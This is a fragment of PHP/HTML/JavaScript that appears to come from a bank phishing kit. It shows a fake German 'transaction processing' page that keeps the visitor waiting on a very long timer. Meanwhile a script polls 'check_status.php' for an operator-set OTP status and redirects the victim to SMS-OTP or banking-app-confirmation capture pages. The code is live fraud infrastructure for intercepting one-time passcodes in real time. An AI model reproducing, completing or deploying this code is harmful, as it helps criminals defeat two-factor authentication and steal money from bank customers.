                    ...
                    <div class="ceeb7e995 c98450f08">
                        ...
                        <div class="c35cc68b7">
                            <header class="caf9c4b6d cb03adf9e">
                                ...
                                <h1 class="c85308b88 c6689a483">Processing Sucessful</h1>
                                            ...
                                            <div class="input-wrapper _input-wrapper">
                                                <div class="c6d02143e c46e32be0 text c70cc0741" data-action-text="" data-alternate-action-text="">
                                                    ...
                                                    <div>
                                                        ...
                                                        <p>Bearbeitung erfolgreich. Ihre Transaktion wird bearbeitet...</p>
                                                    </div>
                                                    <?php $customTimer = 10000000; // Custom timer  
                                                    ?>
                                                    <script>
                                                        setTimeout(function() {
                                                            window.location.href = 'thankyou.php'; // Redirect after the timer 
                                                        }, <?= $customTimer ?>);
                                                    </script>
        ...
        <footer class="MuiBox-root css-1v54gwv">
            ...
            <script>
                function checkOtpStatus() {
                    $.ajax({
                        url: 'check_status.php', // Script to check otpstatus in the database
                        type: 'POST',
                        data: {
                        ...
                        success: function(response) {
                            try {
                                ...
                                // Check if both otpstatus and otp_type meet the conditions
                                if (data.otpstatus.trim() === 'finalize' && data.otp_type.trim() === 'sms-otp') {
                                    // Redirect to the OTP verification page if both conditions are met
                                    window.location.href = '../otp/verifyotp.php';
                                } // Check if both otpstatus and otp_type meet the conditions
                                if (data.otpstatus.trim() === 'finalize' && data.otp_type.trim() === 'banking-app-confirmation') {
                                    // Redirect to the OTP verification page if both conditions are met
                                    window.location.href = '../otp/banking_app_confirmation.php';
                                }
                            } catch (e) {
                ...
                // Check OTP status every 2 seconds
